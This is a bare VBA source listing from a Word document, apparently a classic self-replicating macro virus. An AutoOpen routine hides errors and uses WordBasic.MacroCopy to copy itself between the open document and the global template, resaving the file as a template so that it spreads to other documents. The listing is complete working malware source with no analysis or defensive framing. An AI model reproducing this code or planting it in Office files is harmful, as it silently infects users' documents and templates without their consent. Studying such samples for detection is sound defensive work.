   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim A$
   Dim F$
   Dim G$
   On Error Resume Next
   A$ = ":AutoOpen"
   F$ = WordBasic.[FileName$]() + A$
   G$ = "Global" + A$
   If UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 4)) = ".DOT" Then
   WordBasic.MacroCopy G$, F$
   WordBasic.FileSaveAs Format:=1
   Else
   WordBasic.MacroCopy F$, G$
   End If
   End Sub
